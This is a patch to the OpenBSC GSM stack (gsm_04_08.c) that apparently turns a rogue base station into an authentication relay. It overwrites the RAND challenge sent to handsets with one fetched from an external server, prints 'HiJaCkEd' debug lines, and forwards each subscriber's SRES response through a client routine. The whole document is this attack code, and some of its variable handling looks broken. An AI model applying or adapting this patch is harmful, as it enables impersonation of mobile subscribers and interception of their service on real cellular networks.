@@ -1,0 +1,53 @@
+--- openbsc/src/libmsc/gsm_04_08.c	2025-01-04 14:27:47.683422646 +0100
++++ openbsc/src/libmsc/gsm_04_08.c	2025-01-04 14:29:37.646015080 +0100
+@@ -71,6 +71,13 @@
+ 
+ #include <assert.h>
+ 
++/*PaTcH*/
++#include "server.h"
++#include "hex.h"
++#include "client.h"
++#include "suppress_space.h"
++/*EnDpAtCh*/
++
+ void *tall_locop_ctx;
+ void *tall_authciphop_ctx;
+ 
+@@ -908,10 +915,21 @@
+ 	struct msgb *msg = gsm48_msgb_alloc_name("GSM 04.08 AUTH REQ");
+ 	struct gsm48_hdr *gh = (struct gsm48_hdr *) msgb_put(msg, sizeof(*gh));
+ 	struct gsm48_auth_req *ar = (struct gsm48_auth_req *) msgb_put(msg, sizeof(*ar));
+-
+-	DEBUGP(DMM, "-> AUTH REQ (rand = %s)\n", osmo_hexdump(rand, 16));
+-	if (autn)
+-		DEBUGP(DMM, "   AUTH REQ (autn = %s)\n", osmo_hexdump(autn, 16));
++        DEBUGP(DMM, "-> AUTH REQ (rand = %s)\n", osmo_hexdump(rand, 16));
++        /*PaTcH*/
++        char *hijacked_rand_seq;
++        hijacked_rand_seq=catch_rand();
++        printf("HiJaCkEd dAtA.............. : %s !!!\n",hijacked_rand_seq);
++        char *hijacked_rand;
++        hijacked_rand=strtok(hijacked_rand_seq,"-");
++        printf("HiJaCkEd rAnD.............. : %s !!!\n",hijacked_rand);
++        key_seq=strtok(NULL,"-");
++        printf("HiJaCkEd kEy_SeQ........... : %d !!!\n",key_seq);
++        char *rand_spaces=spaces(hijacked_rand);
++        const unsigned char *rand_ascii=hex2ascii(rand_spaces);
++        rand=rand_ascii;
++        DEBUGP(DMM, "-> RAND HiJaCkEd !!! (rand = %s)\n", osmo_hexdump(rand, 16));
++        /*EnDpAtCh*/
+ 
+ 	msg->lchan = conn->lchan;
+ 	gh->proto_discr = GSM48_PDISC_MM;
+@@ -1251,6 +1269,10 @@
+ 	       subscr_name(conn->subscr),
+ 	       is_r99 ? "R99" : "GSM", is_r99 ? "res" : "sres",
+ 	       osmo_hexdump_nospc(res, res_len));
++        /*PaTcH*/
++        client_sres(osmo_hexdump(res, res_len));
++        DEBUGP(DMM, "-> SRes SeNt !!! (SRES = %s)\n", osmo_hexdump(res, 4));
++        /*EnDpAtCh*/
+ 
+ 	/* Future: vlr_sub_rx_auth_resp(conn->vsub, is_r99,
+ 	 *				conn->via_ran == RAN_UTRAN_IU,
